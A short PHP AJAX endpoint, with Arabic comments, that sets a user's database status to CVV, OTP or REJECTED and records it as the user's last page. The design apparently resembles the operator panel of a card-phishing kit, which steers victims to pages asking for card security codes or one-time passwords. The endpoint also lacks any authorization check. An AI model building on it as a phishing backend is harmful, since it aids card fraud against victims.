<?php
session_start();
require_once 'init.php';

header('Content-Type: application/json');

// قراءة البيانات المُرسلة من AJAX
$input = json_decode(file_get_contents('php://input'), true);

$userId = isset($input['userId']) ? (int)$input['userId'] : 0;
$action = isset($input['action']) ? trim($input['action']) : '';

if ($userId <= 0 || empty($action)) {
    echo json_encode(['success' => false, 'message' => 'بيانات غير صالحة']);
    exit;
}

// تحديد الحالة بناءً على الإجراء
$status = '';
switch ($action) {
    case 'cvv':
        $status = 'CVV';
        break;
    case 'otp':
        $status = 'OTP';
        break;
    case 'reject':
        $status = 'REJECTED';
        break;
    default:
        echo json_encode(['success' => false, 'message' => 'إجراء غير معروف']);
        exit;
}

// تحديث حالة المستخدم في قاعدة البيانات
$User->UpdateStatus($userId, $status);

// تحديث آخر صفحة زارها (اختياري)
$User->updateLastPage($userId, $status);

echo json_encode(['success' => true]);
exit;
?>